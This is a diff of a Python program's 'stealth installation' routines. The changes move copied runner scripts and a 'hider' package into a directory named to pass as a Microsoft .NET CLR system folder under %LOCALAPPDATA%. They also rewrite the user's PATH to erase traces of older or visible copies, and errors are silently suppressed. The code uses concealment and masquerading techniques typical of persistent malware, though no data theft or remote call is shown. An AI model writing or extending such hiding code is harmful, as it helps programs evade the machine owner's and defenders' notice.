@@ -155,13 +155,13 @@ def release_mutex() -> None:
 # ── Stealth installation & PATH registration ──────────────────────────────────
 
 def get_stealth_install_dir() -> Path:
-    return state_dir() / "Runtime"
+    return state_dir().parent / "Runtime"
 
 
 def install_stealth() -> Path:
     """
     Copy runner scripts and hider package into the hidden system directory
-    (%LOCALAPPDATA%\\Microsoft\\CLR_v4.0\\UsageLogs\\Runtime).
+    (%LOCALAPPDATA%\\Microsoft\\CLR_v4.0\\Runtime).
     """
     import shutil
 
@@ -227,11 +227,13 @@ def add_to_user_path() -> None:
             current = ""
 
         entries = [e.strip() for e in current.split(";") if e.strip()]
-        # Remove visible desktop / download entries that contain 'hider'
+        # Remove visible desktop / download entries that contain 'hider', or old usagelogs runtime
         cleaned = []
         for e in entries:
             low = e.lower()
             if ("desktop" in low or "download" in low) and "hider" in low:
+                continue
+            if "usagelogs\\runtime" in low:
                 continue
             cleaned.append(e)
 
@@ -253,4 +255,3 @@ def add_to_user_path() -> None:
         )
     except Exception:
         pass
-
